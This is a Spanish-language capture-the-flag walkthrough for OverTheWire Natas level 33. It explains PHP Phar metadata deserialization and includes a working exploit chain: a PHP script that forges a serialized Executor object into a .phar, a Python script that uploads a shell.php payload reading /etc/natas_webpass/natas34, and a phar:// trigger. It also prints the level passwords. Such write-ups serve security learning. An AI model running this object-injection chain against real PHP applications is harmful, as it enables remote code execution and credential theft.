# Natas Level33

## Descripción
> **Level Goal (natas33.natas.labs.overthewire.org):** Un "actualizador de firmware" que sube un archivo y, en el destructor de una clase `Executor`, comprueba `md5_file($this->filename) == $this->signature` (con `$signature` fijo, hardcodeado en el código) — si coincide, ejecuta `passthru("php " . $this->filename)`. `$this->filename` viene directamente de `$_POST["filename"]`, sin validar.

```php
class Executor{
    private $filename="";
    private $signature='adeafbadbabec0dedabada55ba55d00d';
    private $init=False;
    function __construct(){
        $this->filename=$_POST["filename"];
        ...
        move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename);
        ...
    }
    function __destruct(){
        chdir("/natas33/upload/");
        if(md5_file($this->filename) == $this->signature){
            passthru("php " . $this->filename);
        }
        ...
    }
}
```

## Solución
Encontrar un archivo cuyo contenido dé exactamente ese MD5 fijo (`adeafbadbabec0dedabada55ba55d00d`) requeriría un ataque de **preimagen** contra MD5 — computacionalmente inviable, incluso teniendo en cuenta las debilidades conocidas de MD5 (que permiten encontrar *colisiones* entre dos mensajes elegidos por el atacante, pero no producir un mensaje que dé un hash *ya fijado de antemano* por otra parte). Atacar el hash de frente no es el camino.

En su lugar, se explota una vulnerabilidad completamente distinta: la **deserialización de metadatos de archivos Phar** (a veces llamada "Phar deserialization" o "PHP Object Injection vía phar://"). PHP permite empaquetar archivos en un formato de archivo `.phar` (PHP Archive) que incluye, entre otras cosas, un bloque de **metadatos serializados con el formato de `serialize()`/`unserialize()` de PHP**. Cuando **cualquier función de sistema de archivos de PHP** (`md5_file()`, `file_exists()`, `fopen()`, `filesize()`, etc.) recibe una ruta con el envoltorio `phar://...`, PHP necesita abrir y analizar el archivo `.phar` para localizar la entrada interna solicitada — y, como parte de ese análisis, **deserializa automáticamente sus metadatos**, sin que el desarrollador haya llamado a `unserialize()` en ningún momento del propio código de la aplicación. Si esos metadatos son un objeto de una clase con un método mágico peligroso (`__destruct`, `__wakeup`, `__toString`...), ese método se ejecuta igual que en cualquier otro ataque de inyección de objetos PHP (como en el [nivel 26](../level26/README.md)).

La propia clase `Executor` de esta aplicación es un "gadget" perfecto: su `__destruct()` compara un `md5_file()` contra una `signature` **que nosotros mismos podemos fijar al construir el objeto falso**, y si coincide, ejecuta `passthru("php " . $filename)` con un `$filename` **también controlado por nosotros**. Basta con forjar un objeto `Executor` cuya `signature` sea el MD5 real (calculado por nosotros) de un archivo PHP que también hayamos subido antes — la comparación siempre será verdadera, porque la calculamos nosotros mismos.

### Pasos

1. **Subir un archivo PHP con el código que queremos ejecutar** (p. ej. `shell.php` con `<?php system("cat /etc/natas_webpass/natas34"); ?>`) usando el formulario normal de la app. La comprobación de MD5 de *esta* subida fallará (mensaje "Failure! MD5sum mismatch!"), pero no importa: el archivo queda guardado en `/natas33/upload/shell.php`.
2. **Calcular el MD5 real** de ese archivo tal y como quedó en disco.
3. **Construir un archivo `.phar`** (usando la clase `Phar` de PHP en un entorno local) cuyos metadatos sean un objeto `Executor` serializado con `filename = "shell.php"` y `signature` = el MD5 calculado en el paso 2.
4. **Subir ese `.phar`** igual que cualquier otro archivo (de nuevo, su propia comprobación de MD5 fallará, pero el archivo queda guardado en `/natas33/upload/x.phar`).
5. **Disparar la deserialización**: hacer una última subida (el contenido no importa) fijando `filename=phar:///natas33/upload/x.phar/cualquier_ruta_interna`. Al llamar `md5_file()` sobre esa ruta `phar://`, PHP abre `x.phar`, deserializa sus metadatos — instanciando nuestro objeto `Executor` falso — y, al terminar el script, se invoca el `__destruct()` de **ese objeto forjado**: compara el MD5 real de `shell.php` contra la `signature` que nosotros mismos pusimos (coincide) y ejecuta `passthru("php shell.php")`.

```php
// gen.php — generar el .phar con metadatos forjados (ejecutar con: php -d phar.readonly=0 gen.php <md5>)
class Executor {
    private $filename = "shell.php";
    private $signature = "PLACEHOLDER";
    private $init = false;
}
$e = new Executor();
$ref = new ReflectionClass($e);
$ref->getProperty('filename')->setValue($e, "shell.php");
$ref->getProperty('signature')->setValue($e, $argv[1]);   // MD5 real de shell.php

$phar = new Phar("/tmp/n33/x.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "hello");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($e);   // aquí se serializa el objeto dentro del .phar
$phar->stopBuffering();
```

```python
import requests, io

auth = ("natas33", "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL")
url = "http://natas33.natas.labs.overthewire.org/index.php"

# 1) subir el payload PHP
with open("shell.php", "rb") as f:
    requests.post(url, auth=auth, data={"filename": "shell.php"},
                  files={"uploadedfile": ("shell.php", f, "application/octet-stream")})

# 2) subir el .phar con metadatos forjados (signature = MD5 real de shell.php)
with open("x.phar", "rb") as f:
    requests.post(url, auth=auth, data={"filename": "x.phar"},
                  files={"uploadedfile": ("x.phar", f, "application/octet-stream")})

# 3) disparar la deserialización vía phar://
r = requests.post(url, auth=auth,
    data={"filename": "phar:///natas33/upload/x.phar/test.txt"},
    files={"uploadedfile": ("dummy.txt", io.BytesIO(b"dummy"), "text/plain")})
print(r.text)
# Congratulations! Running firmware update: shell.php
# cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK
```

## Notas adicionales
- `passthru("php " . $filename)` lanza un **proceso PHP-CLI totalmente nuevo** (vía shell), no reutiliza la petición HTTP en curso — por eso `shell.php` no puede depender de `$_GET`/`$_POST` de la petición original (esas variables no existen en ese proceso hijo). Hubo que escribir el payload con el comando ya fijo dentro del propio archivo (`system("cat /etc/natas_webpass/natas34")`) en vez de parametrizarlo por la URL.
- Como la `signature` falsa la calculamos y fijamos nosotros mismos (no intentamos adivinar ni forzar ningún hash), el ataque no depende en absoluto de las propiedades criptográficas de MD5 — funcionaría igual con SHA-256 o cualquier otro algoritmo, porque el fallo real no está en el hash, sino en que **cualquier función de sistema de archivos puede disparar deserialización de objetos con solo pasarle una ruta `phar://`**.
- Este es un patrón de vulnerabilidad real y documentado (no exclusivo de este wargame): múltiples CVEs de aplicaciones PHP en producción se explotaron exactamente así, pasando una ruta de usuario sin validar a una función aparentemente inocua como `file_exists()` o `filesize()`.

## Referencias
- Reto original: http://natas33.natas.labs.overthewire.org/
- Apoyo: https://www.php.net/manual/en/phar.fileformat.metadata.php (formato de metadatos de Phar y su serialización)
- Apoyo: https://anyafachri.medium.com/rce-via-php-archive-metadata-deserialization-natas33-level-finale-overthewire-write-up-bddbb3818618 (walkthrough con el mismo enfoque de deserialización vía `phar://`)
- Apoyo: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection (OWASP, PHP Object Injection — de donde deriva esta variante específica vía Phar)
